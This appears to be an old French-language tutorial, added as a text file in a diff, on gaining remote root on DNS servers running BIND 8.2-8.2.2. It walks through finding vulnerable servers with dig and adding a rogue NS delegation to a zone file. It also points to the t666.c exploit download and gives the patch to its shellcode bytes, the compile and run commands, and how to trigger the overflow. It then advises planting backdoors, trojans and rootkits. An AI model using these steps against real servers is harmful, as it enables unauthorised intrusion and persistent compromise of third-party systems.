@@ -1,0 +1,309 @@
+
+    +--------------------------------------------------------+
+    |BIND 8.2 - 8.2.2 *Remote root Exploit How-To* par E-Mind|
+    +--------------------------------------------------------+
+
+
+(A) Qu'est-ce qu'un DNS?
+
+      1. Comment interroger un DNS?
+      2. Comment trouver un DNS vulnerable?
+
+
+(B) Comment editer les entrées DNS?
+
+      1. Comment trouver un ficher de Zone?
+      2. Comment editer un fichier de Zone?
+
+
+(C) Comment exploiter une machine vulnerable?
+
+      1. Que dois-je obtenir avant d'exploiter la machine?
+      2. Quelle est la theorie derriere l'exploit?
+      3. Ou puis-je avoir l'exploit?
+      4. Pourquoi devrais-je patcher l'exploit?
+      5. Comment patcher l'exploit?
+      6. Comment compiler l'exploit?
+      7. Comment lancer l'exploit?
+      8. Comment faire pour que le serveur vulnerable fasse un requete vers mon ip?
+      9. Que faire avant de quitter le shell?
+
+
+(D) Qui doit etre remercié pour ce HowTo?
+
+      1. Qui est la personne qui m'a motive pour l'ecrire?
+      2. Qui suis-je?
+      3. Distribuer/Changer ce HowTo?
+      4. Final Credits et Greets :)
+
+
+-- Traduit par Nightbird (http://www.nightbird.free.fr)
+
+Section A - Qu'est-ce qu'un DNS?
+---------------------------------
+
+   Un DNS - Domain Name Server, est utilisé pour convertir les noms des stations vers
+   les adresses IP et vice-versa.
+   par exemple: www.infoseek.com = 204.162.96.173
+
+      1. Comment interroger un DNS?
+	 Tout d'abord, vous devrez probablement savoir que quand vous configurez
+	 votre TCP/IP et souhaitez utiliser les noms d'hotes dans votre browser web
+	 pour avoir un site web, au lieu de taper l'adresse IP du site, vous aurez
+	 besoin de configurer un serveur DNS. Vous obtiendrez l'adresse IP de votre
+	 serveur DNS par votre ISP. Pour faire des requetes au serveur DNS, les 
+	 systemes Unix (et NT) ont un outil appele "nslookup", la syntaxe de cet
+	 outil est:
+         $nslookup <hostname>
+         ou
+         $nslookup <ip>
+	 Un serveur DNS proprement configure contient deux "listes" pour un domaine
+	 appelées fichiers de Zone. Un fichier de zone est utilisé pour la resolution
+	 du nom de l'hote vers l'IP et l'autre est utilisé pour l'IP vers l'hostname
+	 (reverse lookup). nslookup peut etre utilisé d'une facon interactive, c'est 
+	 la facon avec laquelle nous travaillerons. Tapez simplement nslookup au 
+	 prompt et puis entrer. Vous aurez un prompt ">", a partir duquel vous pouvez
+	 demarrer en tapant une adresse IP ou un nom d'hote. Il y a des commandes 
+	 dans nslookup dont nous discuterons plus tard dans ce howto qui vous autorise
+	 a avoir plus d'informations.
+ 
+      2. Comment trouver un DNS vulnerable?
+	 Souvenez vous, nous exploitons des Serveurs de Noms.
+	 Nous devons d'abord trouver la version du service DNS qui est lance sur 
+	 l'hote distant. De plus, nous avons besoin de connaitre l'OS, mais il y a
+	 beaucoup d'HOW-TO sur ca.
+	 Nous utiliserons un outil appele "dig", qui est disponible sur beaucoup 
+	 de systemes Unix. La syntaxe ressemble à ca:
+         $dig @<victim_ip> version.bind chaos txt | grep \"8
+         Regardez la sortie. Si vous voyez: 8.2 ou 8.2.1 ou 8.2.2 alors il est
+	 vulnerable. Si vous voyez 8.2.2P2 - P5, il ne l'est pas.
+	 Si vous n'obtenez pas de sortie et que vous ne voyez rien, ca signifie que
+	 l'admin DNS a probablement edite la source pour que le serveur ne vous
+	 donne pas l'information. Il peut etre vulnerable.
+
+Section B - Comment editer les entrées DNS?
+--------------------------------------------
+
+   La premiere chose que vous devez savoir est que, le DNS est seulement des fichiers
+   texte, et les entrées sont ajoutées ou changées en editant ces fichiers texte
+   et en redemarrant le service. Le principal fichier qui controle le service DNS
+   est /etc/named.conf ou /etc/named.boot. 
+
+      1. Comment trouver un ficher de Zone?
+	 Comme je le disais plus tot, un DNS proprement configure a deux "listes" ou
+	 fichiers de zone pour chaque domaine qu'il sert.
+	 Vous aurez besoin d'edite ce fichier de zone pour changer ou ajouter des 
+	 entrées à ce domaine. Un domaine est par exemple, infoseek.com, et le nom
+	 de l'hote est www, le FQDN est www.infoseek.com. FQDN signifie Fully 
+	 Qualified Domain Name. Pour trouver le fichier de zone pour FQDN vers IP
+	 pour le domaine infoseek.com, vous devrez d'abord interroger votre serveur 
+	 DNS pour savoir quel est le serveur DNS primaire pour infoseek.com: 
+         
+         $nslookup
+         Default Server:  xxxxxx.xxxxxxx.xx.xx
+         Address:  xxx.xx.xx.xx
+         >set q=ns<ENTER>
+         >infoseek.com<ENTER>
+         >infoseek.com      nameserver = NS-UU.infoseek.com
+         >NS-UU.infoseek.com    internet address = 198.5.208.3
+
+	 Comme vous voyez, maintenant nous avons l'adresse ip du serveur de nom 
+	 d'infoseek. Supposons que nous sommes root. Nous "SSH" vers leur DNS, et 
+	 localisons le fichier /etc/named.conf. Nous regardons ce fichier et nous
+	 voyons en haut de la section des options qu'il y a une ligne qui dit:
+         directory "/var/named"
+	 Ca signifie que les fichiers de zone se situent dans /var/named. Nous 
+	 descendons plus bas dans le fichier et nous voyons les sections de zone,
+	 nous voyons une zone pour infoseek.com qui ressemble à ca:
+
+         zone "infoseek.com"{
+              type master;
+              file "infoseek.com.zone";
+         };
+
+	 
+         Le fichier est donc:
+         /var/named/infoseek.com.zone, et c'est ce fichier que nous devrons editer.
+
+      2. Comment editer un fichier de Zone?
+	 D'abord regardons ce fichier de zone.
+	 Nous voyons en haut un enregistrement SOA, puis nous voyons quelque chose 
+	 comme:
+         
+         @                 IN     NS      NS-UU.infoseek.com.
+         www               IN     A       204.192.96.173
+         ftp               IN     CNAME   corp-bbn
+         corp-bbn          IN     A       204.192.96.2
+         .
+         .
+         .
+
+	 Comme nous pouvons voir, il y a plusieurs types d'enregistrements, pour que
+	 notre exploit fonctionne, seul l'enregistrement NS nous interesse.
+	 Un enregistrement A est un enregistrement de type Hostname vers IP.
+	 CNAME est une Canonical Name, qui est un Alias à un enregistrement A.        
+	 Un enregistrement PTR est un enregistrement Pointer, qui est l'opposé de A.
+	 Les PTR sont utilisés dans les autres fichiers de zone (nous ne parlerons
+	 pas de ca dans ce document).
+	 Un enregistrement NS est un enregistrement de type Name Server qui dit quel 
+	 est le Name Server pour un domaine specifique ou un sous-domaine.
+	 L'enregistrement NS NS-UU.infoseek.com finit avec un ".". C'est parce que 
+	 nous specifions le FQDN et non le nom de l'hote.
+	 Donc si nous ne mettons pas:
+         NS-UU.infoseek.com.infoseek.com.
+         Au lieu de:
+
+         www                    IN      A       204.192.96.173
+         Nous pourrons ecrire:
+         www.infoseek.com.      IN      A       204.192.96.173
+         Ce qui est la meme chose.
+         
+	 Pour que notre exploit marche, nous aurons besoin d'ajouter un sous-domaine
+	 à un serveur de noms sur le net. Donc supposons a nouveau que nous sommes 
+	 root pour NS-UU.infoseek.com.
+         
+	 Comment ajoutons nous un sous-domaine?
+	 Nous avons juste besoin d'ajouter un autre enregistrement NS.
+
+         subdomain              IN      NS      hacker.box.com.
+
+	 Ce qui signifie que le serveur de noms  du domaine subdomaine.infoseek.com
+	 sera hacker.box.com.
+	 hacker.box.com aura besoin d'etre resolu par l'adresse IP de votre machine
+	 donc entrez votre FQDN à la place.
+	 Maintenant nous devons redemarrer le serveur de nom pour que les changements
+	 prennet effet.
+         
+         #/usr/sbin/ndc restart<ENTER>
+         new pid is 24654
+         #
+
+
+Section C - Comment exploiter une machine vulnerable?
+--------------------------------------------------------
+
+      1. Que dois-je obtenir avant d'exploiter la machine?
+	 Vous aurez besoin de privileges root sur un serveur de noms PRIMAIRE sur
+	 Internet qui est Authoritative pour un Domaine sur le net.
+	 Vous aurez aussi besoin d'une machine a partir de laquelle vous lancerez
+	 l'exploit. Au sujet du DNS, vous pourrez demander à quelqu'un qui a les
+	 privileges root sur un DNS d'editer les fichiers de zone pour vous. 
+
+      2. Quelle est la theorie derriere l'exploit?
+	 L'exploit utilise un buffer overflow dans BIND versions 8.2 - 8.2.2 pour
+	 obtenir un shell root à distance. L'exploit "bind" sur le port 53 sur la 
+	 machine locale et agit comme un serveur DNS. Quand quelqu'un lui lance une 
+	 requete, il envoie un large enregistrement NXT qui contient le code qui 
+	 exploitera le serveur BIND distant.
+	 Pour avoir plus d'information sur comment les buffers overflows fonctionnent,
+	 lisez l'excellent article de Aleph One:
+         
+         Phrack 49 Article 14 - Smashing The Stack For Fun And Profit.
+         URL: http://www.phrack.com/search.phtml?view&article=p49-14
+
+      3. Ou puis-je avoir l'exploit?
+         http://www.hack.co.za/daem0n/named/t666.c
+
+      4. Pourquoi devrais-je patcher l'exploit?
+	 ADM a mis un petit "bug" dans le code. Il faut changer le shellcode, au lieu
+	 de lancer "bin/sh" l'exploit lance "/adm/sh".
+
+      5. Comment patcher l'exploit?
+	 Comme vous pouvez le voir seulemnt un petit changement a besoin d'etre fait
+	 dans le code.
+
+         / = 2F(HEX)   ===>  / = 2F(HEX)
+         a = 61(HEX)   ===>  b = 62(HEX)
+         d = 64(HEX)   ===>  i = 69(HEX)
+         m = 6D(HEX)   ===>  n = 6E(HEX)
+         / = 2F(HEX)   ===>  / = 2F(HEX)
+
+	 Donc, tout ce que nous avons besoin de faire est de chercher le code source
+         0x2f,0x61,0x64,0x6d,0x2f et de le remplacer par 0x2f,0x62,0x69,0x6e,0x2f
+
+      6. Comment compiler l'exploit?
+         Comme toujours:
+         $gcc t666.c -o t666<ENTER>
+         $
+
+      7. Comment lancer l'exploit?
+         $su<ENTER>
+         Password:<password><ENTER>
+         #./t666 1<ENTER>
+         
+	 Maintenant l'exploit est attache au port 53(si vous lancez un serveur DNS sur
+	 la machine sur laquelle vous voulez lancer l'exploit, vous devez d'abord
+	 killer le serveur de nom, utilisez: #killall -9 named)
+	 L'exploit attend maintenant des requetes, des que quelqu'un interrogera 
+	 votre machine contenant l'exploit, vous aurez une sortie du genre:
+         Received request from xxx.xx.xx.xx:1025 for xxx.xxxxxxxxx.xx.xx type=1
+	 Si c'est un serveur DNS, et si c'est un serveur vulnerable, lance sur 
+	 Linux Redhat 6.x - named 8.2/8.2.1 (c'est parce que nous avons choisi 
+	 l'architecture 1, tapez ./t666 sans arguments et vous aurez une liste 
+	 d'architectures sur lesquelles l'exploit fonctionne), vous aurez un shell
+	 root distant.
+
+      8. Comment faire pour que le serveur vulnerable fasse un requete vers mon ip?
+	 C'est tres facile maintenant, une fois que vous avez ajoute un sous-domaine
+	 dans un serveur de noms sur le net et fait de vous son DNS, la seule 
+	 chose qui reste à faire est d'interroge le serveur vulnerable pour un hote 
+	 à l'interieur du sous-domaine ajoute.
+
+         $nslookup
+         >server <victim><ENTER>
+         >www.subdomain.infoseek.com<ENTER>
+
+	 Ce qui se passera est que le serveur interrogera dans ce cas 
+	 NS-UU.infoseek.com pour l'IP de www.subdomain.infoseek.com.
+	 NS-UU.infoseek.com commencera à chercher et obtiendra subdomain, parce que
+	 subdomain a son propre enregistrement NS, il dira à <victim> que
+	 hacker.box.com (votre hostname dans ce cas) est l'Authoritative Name
+         Server pour subdomain.infoseek.com. Maintenant, ce qui se passe est que
+	 <victim> interrogera hacker.box.com pour l'adresse ip de 
+         www.subdomain.infoseek.com. BOOM! :)
+
+      9. Que faire avant de quitter le shell?
+	 Quand vous exploitez BIND, ca crashera named, donc vous avez besoin d'ajouter
+	 des sortes de backdoors pour pouvoir revenir et le redemarrer. 
+	 *NE PAS ESSAYER DE LE REDEMARRER DANS LE SHELL*
+	 Il y a plein de trojans et de rootkits que vous pouvez installer sur le
+	 serveur.
+
+Section D - Qui doit etre remercié pour ce HowTo?
+--------------------------------------------------
+
+      1. Qui est la personne qui m'a motive pour l'ecrire?
+	 Cette personne n'est autre que gov-boi, il s'occupe du site www.hack.co.za.
+	 Sans lui, ce How-To n'aurait jamais ete ecrit!
+	 Merci Gov-Boi
+
+      2. Qui suis-je?
+	 Je suis E-Mind, vous pouvez me trouver sur IRC(EFNet)
+	 Si vous trouvez des erreurs, s'il vous plait /msg moi sur IRC. 
+
+      3. Distribuer/Changer ce HowTo?
+	 Je ne prend aucune responsabilite dans vos actions.
+	 Vous etes libre de faire ce que vous voulez avec ce document
+
+      4. Final Credits et Greets :)
+
+         Credits:
+         
+         Gov-Boi - Keep up the good work man! ;p
+         
+         Aleph One - no other article out there explains buffer overflows
+                     better then yours!
+         
+         ADM - for writing this cool exploit.
+
+
+         Greetz:
+
+         #myth!, #!glich, #972, #darknet, #feed-the-goats -  `sup guyz? ;]
+
+
+EOF
+
+
+------------------------------------------------------------------
+Traduit par Nightbird (http://www.nightbird.free.fr)
